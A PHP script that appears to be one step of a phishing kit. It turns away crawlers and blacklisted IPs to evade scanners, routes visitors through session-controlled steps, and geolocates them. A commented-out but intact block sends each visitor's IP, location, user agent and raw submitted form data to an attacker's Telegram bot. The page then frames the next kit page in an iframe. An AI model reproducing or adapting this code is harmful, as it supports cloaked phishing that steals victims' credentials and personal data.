<?php

use Jaybizzle\CrawlerDetect\CrawlerDetect;
use IP2Location\Database;
use Vectorface\Whip\Whip;

session_start();
require_once './../config/config.php';

$CrawlerDetect = new CrawlerDetect;

// Check the user agent of the current 'visitor'
if ($CrawlerDetect->isCrawler()) {
    // true if crawler user agent detected
    http_response_code(403);
    die();
}

$whip = new Whip();
$clientAddress = $whip->getValidIpAddress();

// Open a database connection
$pdo = new PDO('sqlite:' . BASE_PATH . '/data/db/blacklist.db');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Create the 'blacklist' table if it doesn't exist
$pdo->exec("CREATE TABLE IF NOT EXISTS blacklist (
    ip_address TEXT PRIMARY KEY,
    blocked_at TEXT
)");

// Check if the visitor's IP is blacklisted
$stmt = $pdo->prepare("SELECT * FROM blacklist WHERE ip_address = :ip");
$stmt->execute(['ip' => $_SERVER['REMOTE_ADDR']]);
if ($stmt->fetch()) {
    http_response_code(403);
    die();
}

if (!isset($_GET['op']) or (isset($_GET['op']) && empty($_GET['op'])) or (isset($_GET['op']) && !in_array($_GET['op'], $_SESSION["op"]))) {
    header("Location: ?op=" . $_SESSION["op"][0]);
    die();
}

$parsed_url = parse_url((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");

$scheme = isset($parsed_url['scheme']) ? $parsed_url['scheme'] . '://' : '';
$host = isset($parsed_url['host']) ? $parsed_url['host'] : '';
$port = isset($parsed_url['port']) ? ':' . $parsed_url['port'] : '';
$user = isset($parsed_url['user']) ? $parsed_url['user'] : '';
$pass = isset($parsed_url['pass']) ? ':' . $parsed_url['pass']  : '';
$pass = ($user || $pass) ? "$pass@" : '';

//Handle update request. As the form's action attribute is set to the same script, but 'POST' method, 
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    /*
	   Cache whole database into system memory and share among other scripts & websites
	   WARNING: Please make sure your system have sufficient RAM to enable this feature
	*/
    // $db = new \IP2Location\Database('./data/IP-COUNTRY-SAMPLE.BIN', \IP2Location\Database::SHARED_MEMORY);
    /*
	   Cache the database into memory to accelerate lookup speed
	   WARNING: Please make sure your system have sufficient RAM to enable this feature
	*/
    // $db = new \IP2Location\Database('./data/IP-COUNTRY-SAMPLE.BIN', \IP2Location\Database::MEMORY_CACHE);


    /*
		Default file I/O lookup
	*/
    $db = new Database(BASE_PATH . '/data/IP2LOCATION-LITE-DB11.IPV6.BIN', Database::FILE_IO);

    $records = $db->lookup($clientAddress, Database::ALL);

    $telegram = new \Telegram(BOT_API_KEY);

    // Construct the URLs
    /* $url = SESSION_URL . '/callback.php?session_id=' . session_id() . '&url=' . base64_encode("$scheme$user$pass$host$port/" . APP_PATH . '/' . EMBED_PATH . '?url=' . base64_encode("$scheme$user$pass$host$port/" . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][0]) . '?op=' . $_SESSION["op"][0])) . '&redirect=true';

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '', 'url' => $url],
            ['text' => '', 'url' => $url],
        ],
        [
            ['text' => '', 'url' => $url],
        ],
    ]
]; */

    /* if ($_GET['op'] === $_SESSION["op"][0]) {
        $result = $telegram->sendMessage([
            'chat_id' => CHAT_ID,
            'text' => "" . PHP_EOL . PHP_EOL .
                "IP Address: " . $records['ipAddress'] . PHP_EOL .
                "Country Name: " . $records['countryName'] . PHP_EOL .
                "Region Name: " . $records['regionName'] . PHP_EOL .
                "City Name: " . $records['cityName'] . PHP_EOL .
                "ZIP Code: " . $records['zipCode'] . PHP_EOL .
                "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL .
                "Raw: " . json_encode($_POST),
            // 'reply_markup' => json_encode($keyboard),
        ]);

        header("Location: ?op=" . $_SESSION["op"][1]);
        die();
    } */
}
?>

<?php include BASE_PATH . '/src/includes/header.php' ?>

<iframe src="<?php echo "$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][1]) . '?op=' . $_GET["op"]; ?>" frameborder="0" style="height: 500px; width: 100%;"></iframe>

<?php include BASE_PATH . '/src/includes/footer.php' ?>